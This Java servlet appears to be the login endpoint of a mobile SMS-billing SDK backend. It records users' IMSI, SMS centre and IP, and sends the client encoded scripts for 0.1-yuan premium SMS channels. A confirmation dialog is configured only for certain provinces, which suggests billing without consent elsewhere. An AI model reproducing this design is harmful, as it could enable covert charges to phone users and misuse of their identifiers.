package com.zsyj.fee.servlet;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.List;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.lang3.StringUtils;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;

import com.zsyj.fee.common.enums.SdkResultEnum;
import com.zsyj.fee.entity.SdkStrategy;
import com.zsyj.fee.handler.FeeRequestFactory;
import com.zsyj.fee.handler.ProcessorCommon;
import com.zsyj.fee.handler.strategy.TroneFilterStrategy;
import com.zsyj.fee.service.OrderLogService;
import com.zsyj.fee.service.SdkStrategyService;
import com.zsyj.fee.service.UsersService;
import com.zsyj.fee.service.impl.OrderLogServiceImpl;
import com.zsyj.fee.service.impl.SdkConfirmDialogAreaServiceImpl;
import com.zsyj.fee.service.impl.SdkStrategyServiceImpl;
import com.zsyj.fee.service.impl.UsersServiceImpl;
import com.zsyj.fee.threadpool.AreaUnknowJob;
import com.zsyj.fee.threadpool.OrderLogJob;
import com.zsyj.fee.threadpool.SdkThreadPool;
import com.zsyj.fee.vo.Accesslog;
import com.zsyj.fee.vo.FeeRequest;
import com.zsyj.fee.vo.SdkUser;
import com.zsyj.fee.vo.TroneConfigInfo;
import com.zsyj.fee.vo.UserCash;

public class LoginServlet  extends HttpServlet {

	private static final long serialVersionUID = -1326882274135083216L;

	private static Log logger = LogFactory.getLog(LoginServlet.class.getName());
	
	private ProcessorCommon processorHelper = new ProcessorCommon();
	private UsersService userService = UsersServiceImpl.getInstance();
	private SdkStrategyService strategyService = SdkStrategyServiceImpl.getInstance();
	private OrderLogService orderLogService = OrderLogServiceImpl.getInstance();
	private TroneFilterStrategy troneFilterStrategy = new TroneFilterStrategy();
	
	@Override
	public void doPost(HttpServletRequest request,HttpServletResponse response) throws IOException,ServletException //抛出异常  
	{
		this.doGet(request, response);
	}
	
	@Override
	public void doGet( HttpServletRequest request,HttpServletResponse response ) throws IOException,ServletException //抛出异常  
	{
		logger.debug( " ============================== start login " );
		
		FeeRequest feeRequest = FeeRequestFactory.create( request );
		
		response.getWriter().print( handlerLoginRequest( feeRequest ) );
		
		feeRequest = null;
	}
	
	public String handlerLoginRequest( FeeRequest feeRequest  )
	{
		String freshCodeStr = null;
		SdkStrategy strategy = null;
		Accesslog accessLog = Accesslog.getLoginInstance( feeRequest );
		
		//查询用户信息，不存在则新增
		SdkUser user = userService.handlerUserInfoByFeeRequest(feeRequest);
		
		if( "0000".equals( user.getAreaCode() ) || StringUtils.isBlank( user.getAreaCode() ) )
		{
			// 将用户的imsi和对应的号段插入到统计表里
			SdkThreadPool.getInstance().excute( new AreaUnknowJob( user ) );
			
			logger.error( " the user is area is 0000, imsi[" + user.getImsi() + "] smscenter[" 
					+ user.getSmscenter() + "] ip[" + user.getIp() + "]" );
		}
		
		accessLog.setAreaCode( user.getAreaCode());
		accessLog.setCityCode( user.getTelCode());
		accessLog.setOperatorType( user.getTroneType() );
		
		//指定省份上二次确认提示框
		if( SdkConfirmDialogAreaServiceImpl.getInstance().findByUser( user ) != null )
		{
			logger.info( "the user in confirm dialog area" );
			strategy = new SdkStrategy();
			strategy.setConfirmDialogType( (byte)3 );
		}
		else
		{
			strategy = strategyService.findStrategy(user);
			
			//获取一毛钱的计费脚本
			if( strategy.getIsFreshOne() == 0 )
			{
				freshCodeStr = this.freshCode( feeRequest, strategy, user, accessLog );
			}			
		}
		
		//线程池--插入用户来访记录
		accessLog.setResult( SdkResultEnum.SUCCESS.getCode() );
		logger.info( accessLog.toString() );
		//SdkThreadPool.getInstance().excute( new AccessLogJob( this.accessLog ) );
		
		return packageText( strategy, freshCodeStr );
	}
	
	private String freshCode( FeeRequest feeRequest, SdkStrategy strategy, SdkUser user, Accesslog accessLog )
	{
		StringBuffer freshCodeSb = new StringBuffer();
		
		if( strategy != null && strategy.getIsFreshOne() == 0 )
		{
			try {
				
				UserCash userCash = this.orderLogService.staticsUserCash(user.getImsi());
				
				//轮询每个短信通道中的配置方案，满足用户地区和限制条件的
				List<TroneConfigInfo> usefulTroneList = this.troneFilterStrategy.findUsefulTrone(0.1, user, userCash);
				
				if( usefulTroneList != null && usefulTroneList.size() > 0 )
				{
					freshCodeSb.append( "<infos>" );
					for( TroneConfigInfo trone : usefulTroneList )
					{
						//组装协议脚本
						freshCodeSb.append( processorHelper.getFeeInfoCommandByTroneInfo( trone ) );
						
						//记录代码分配记录
						SdkThreadPool.getInstance().excute( new OrderLogJob( user, feeRequest, trone, (byte) 0 ) );
					}
					freshCodeSb.append( "</infos>" );
					
					accessLog.setRequestValue( "0.1" );
				}
				else
				{
					accessLog.setResult( SdkResultEnum.FAIL_NoCode.getCode() );
				}
				
				
			} catch ( Exception e ) {
				e.printStackTrace();
				logger.error( e.getMessage() );
			}
		}
		
		return freshCodeSb.toString();
	}
	
	//根据策略组装脚本
	private String packageText( SdkStrategy strategy, String freshCodeStr )
	{
		StringBuffer outSb = new StringBuffer();
		
		try {
			if( StringUtils.isNotBlank( freshCodeStr ) )
			{
				freshCodeStr = URLEncoder.encode( freshCodeStr, "utf8" );				
			}
		} catch ( Exception e ) {
			e.printStackTrace();
			logger.error( e.getMessage() );
		}
		
		outSb.append( "<dialogType=\"" + strategy.getConfirmDialogType() + "\">" );
		outSb.append( "<downOneMao=\"" + freshCodeStr + "\">" );
		
		logger.info( "loginInfo:" + outSb.toString() );
		
		return outSb.toString(); 
	}
}
